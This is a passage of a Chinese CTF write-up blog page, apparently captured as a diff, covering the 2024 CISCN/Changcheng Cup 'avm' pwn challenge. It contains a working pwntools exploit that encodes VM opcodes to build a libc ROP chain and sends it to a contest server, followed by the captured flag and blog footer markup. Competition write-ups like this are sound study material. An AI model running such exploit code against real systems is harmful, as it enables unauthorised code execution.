class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">div</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">4</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">5</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">and_</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">6</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shl</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">7</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shr</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">8</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_stack</span>(<span class="params">tarreg,reg1,num</span>):</span><br><span class="line">    payload = p32((<span class="number">9</span>&lt;&lt;<span class="number">0x1c</span>)+(tarreg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((num&amp;<span class="number">0xfff</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_reg</span>(<span class="params">tarreg,reg1,num</span>):</span><br><span class="line">     payload = p32((<span class="number">10</span>&lt;&lt;<span class="number">0x1c</span>)+(tarreg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((num&amp;<span class="number">0xfff</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">     <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_addr</span>(<span class="params">offset,tar</span>):</span><br><span class="line">    binary = <span class="built_in">bin</span>(offset)[<span class="number">2</span>:][::-<span class="number">1</span>]</span><br><span class="line">    payload = add(tar,<span class="number">31</span>,<span class="number">31</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(binary)):</span><br><span class="line">        <span class="keyword">if</span> binary[i]==<span class="string">&quot;1&quot;</span>:</span><br><span class="line">            payload += add(tar,tar,i)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line">    </span><br><span class="line"><span class="comment"># p = process(&quot;./pwn&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;47.94.202.237&quot;</span>,<span class="number">36894</span>)</span><br><span class="line"><span class="comment">#-0x29d90</span></span><br><span class="line">payload =  write_reg(<span class="number">25</span>,<span class="number">0</span>,<span class="number">0xd38</span>) + write_reg(<span class="number">0</span>,<span class="number">31</span>,<span class="number">0xd30</span>)+add(<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>)+add(<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>)+add(<span class="number">3</span>,<span class="number">2</span>,<span class="number">2</span>)+add(<span class="number">4</span>,<span class="number">3</span>,<span class="number">3</span>)+add(<span class="number">5</span>,<span class="number">4</span>,<span class="number">4</span>)+add(<span class="number">6</span>,<span class="number">5</span>,<span class="number">5</span>)</span><br><span class="line">payload += add(<span class="number">7</span>,<span class="number">6</span>,<span class="number">6</span>)+add(<span class="number">8</span>,<span class="number">7</span>,<span class="number">7</span>)+add(<span class="number">9</span>,<span class="number">8</span>,<span class="number">8</span>)+add(<span class="number">10</span>,<span class="number">9</span>,<span class="number">9</span>)+add(<span class="number">11</span>,<span class="number">10</span>,<span class="number">10</span>)+add(<span class="number">12</span>,<span class="number">11</span>,<span class="number">11</span>)+add(<span class="number">13</span>,<span class="number">12</span>,<span class="number">12</span>)+add(<span class="number">14</span>,<span class="number">13</span>,<span class="number">13</span>)+add(<span class="number">15</span>,<span class="number">14</span>,<span class="number">14</span>)</span><br><span class="line">payload += add(<span class="number">16</span>,<span class="number">15</span>,<span class="number">15</span>)+add(<span class="number">17</span>,<span class="number">16</span>,<span class="number">16</span>)+add(<span class="number">18</span>,<span class="number">17</span>,<span class="number">17</span>)+add(<span class="number">19</span>,<span class="number">18</span>,<span class="number">18</span>)+add(<span class="number">20</span>,<span class="number">19</span>,<span class="number">19</span>)+add(<span class="number">21</span>,<span class="number">20</span>,<span class="number">20</span>)+add(<span class="number">22</span>,<span class="number">21</span>,<span class="number">21</span>)+add(<span class="number">23</span>,<span class="number">22</span>,<span class="number">22</span>)</span><br><span class="line">payload += make_addr(<span class="number">0x29d90</span>,<span class="number">24</span>)</span><br><span class="line">payload += sub(<span class="number">25</span>,<span class="number">25</span>,<span class="number">24</span>)</span><br><span class="line">payload += make_addr(<span class="number">0x29139</span>,<span class="number">24</span>) + add(<span class="number">29</span>,<span class="number">24</span>,<span class="number">25</span>) + write_stack(<span class="number">29</span>,<span class="number">31</span>,<span class="number">0x118</span>) </span><br><span class="line">payload += make_addr(<span class="number">0x2a3e5</span>,<span class="number">24</span>) + add(<span class="number">26</span>,<span class="number">24</span>,<span class="number">25</span>) + write_stack(<span class="number">26</span>,<span class="number">31</span>,<span class="number">0x120</span>) </span><br><span class="line">payload += make_addr(<span class="number">0x1d8678</span>,<span class="number">24</span>) + add(<span class="number">27</span>,<span class="number">24</span>,<span class="number">25</span>) + write_stack(<span class="number">27</span>,<span class="number">31</span>,<span class="number">0x128</span>)</span><br><span class="line">payload += make_addr(<span class="number">0x50D70</span>,<span class="number">24</span>) + add(<span class="number">28</span>,<span class="number">24</span>,<span class="number">25</span>) + write_stack(<span class="number">28</span>,<span class="number">31</span>,<span class="number">0x130</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#write_reg(15,0,0xd20)  0x1000</span></span><br><span class="line"><span class="comment"># +write_reg(1,0,0x118)+write_reg(2,0,0x100)+write_reg(3,0,0xd38)+sub(4,1,2)+mul(5,4,4)</span></span><br><span class="line"><span class="comment"># payload += mul(5,5,17)*5 + sub(5,5,15)*6</span></span><br><span class="line">log.info(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendafter(<span class="string">&quot;opcode:&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>flag值</strong></p>
+<p>flag{330c99dc-129a-4348-8f1c-bebfcff77b79}</p>
+
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> 2024ciscn&amp;长城杯初赛pwn方向部分题解</li>
+        <li><strong>Author:</strong> collectcrop</li>
+        <li><strong>Created at
+                :</strong> 2024-12-18 22:28:40</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2024-12-18 22:35:38
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://collectcrop.github.io/2024/12/18/2024ciscn-长城杯初赛pwn方向部分题解/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+		</div>
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/blog/tags/wp/">#wp</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/blog/tags/ciscn/">#ciscn</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/blog/tags/pwn/">#pwn</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+  <div class="recommended-article px-2 sm:px-6 md:px-8">
+   <div class="recommended-desktop">
+    <div class="recommended-article-header text-xl md:text-3xl font-bold mt-10">
+     <i aria-hidden="true"></i><span>推荐阅读</span>
+    </div>
+    <div class="recommended-article-group"><a class="recommended-article-item" href="/blog/2024/09/22/go-pwn/" title="gopwn初探" rel="bookmark">
+  <img src="/images/wallhaven-wqery6-light.webp" alt="gopwn初探" class="!max-w-none">
+  <span class="title">gopwn初探</span>
+</a><a class="recommended-article-item" href="/blog/2024/11/28/tls-dtor-list劫持exit执行-高版本glibc利用思路之一/" title="tls_dtor_list劫持exit执行-高版本glibc利用思路之一" rel="bookmark">
+  <img src="/images/wallhaven-wqery6-light.webp" alt="tls_dtor_list劫持exit执行-高版本glibc利用思路之一" class="!max-w-none">
+  <span class="title">tls_dtor_list劫持exit执行-高版本glibc利用思路之一</span>
+</a><a class="recommended-article-item" href="/blog/2024/09/21/mips-pwn/" title="mips_pwn" rel="bookmark">
+  <img src="/images/wallhaven-wqery6-light.webp" alt="mips_pwn" class="!max-w-none">
+  <span class="title">mips_pwn</span>
+</a></div>
+   </div>
+   <div class="recommended-mobile">
+   <div class="recommended-article-header text-xl md:text-3xl font-bold mt-10">
+     <i aria-hidden="true"></i><span>推荐阅读</span>
+   </div>
+   <div class="recommended-article-group"><a class="recommended-article-item" href="/blog/2024/09/22/go-pwn/" title="gopwn初探" rel="bookmark">
+  <img src="/images/wallhaven-wqery6-light.webp" alt="gopwn初探" class="!max-w-none">
+  <span class="title">gopwn初探</span>
+</a><a class="recommended-article-item" href="/blog/2024/11/28/tls-dtor-list劫持exit执行-高版本glibc利用思路之一/" title="tls_dtor_list劫持exit执行-高版本glibc利用思路之一" rel="bookmark">
+  <img src="/images/wallhaven-wqery6-light.webp" alt="tls_dtor_list劫持exit执行-高版本glibc利用思路之一" class="!max-w-none">
+  <span class="title">tls_dtor_list劫持exit执行-高版本glibc利用思路之一</span>
+</a></div>
+   </div>
+  </div>
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/blog/2024/11/28/tls-dtor-list%E5%8A%AB%E6%8C%81exit%E6%89%A7%E8%A1%8C-%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E4%B9%8B%E4%B8%80/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item">tls_dtor_list劫持exit执行-高版本glibc利用思路之一</span>
+						<span class="post-nav-item">Next posts</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">On this page</div>
+		<div class="page-title">2024ciscn&amp;长城杯初赛pwn方向部分题解</div>
+		<ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#pwn-anote"><span class="nav-text">pwn-anote</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#pwn-avm"><span class="nav-text">pwn-avm</span></a></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2024</span>
+              -
+            
+            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/blog/">collectcrop</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        15 posts in total
+                    </span>
+                    
+                        <span>
+                            43.8k words in total
+                        </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.1</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container">
+	<img src="">
+</div>
+
+	
+
+</main>
+
+
+
+<script src="/blog/build/js/libs/Swup.min.js"></script>
+
+<script src="/blog/build/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/blog/build/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/blog/build/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/blog/build/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/blog/build/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+	
+<script src="/blog/build/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/blog/build/js/utils.js" type="module"></script>
+
+<script src="/blog/build/js/main.js" type="module"></script>
+
+<script src="/blog/build/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/blog/build/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/blog/build/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/blog/build/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/blog/build/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/blog/build/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/blog/build/js/tools/runtime.js"></script>
+
+    
+<script src="/blog/build/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/blog/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/blog/build/js/libs/Typed.min.js"></script>
+
+  
+<script src="/blog/build/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+
+
+
+    
+<script src="/blog/build/js/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/blog/build/js/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/blog/build/js/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+<script src="/blog/build/js/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+<script src="/blog/build/js/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+
+	
+</body>
+
+</html>
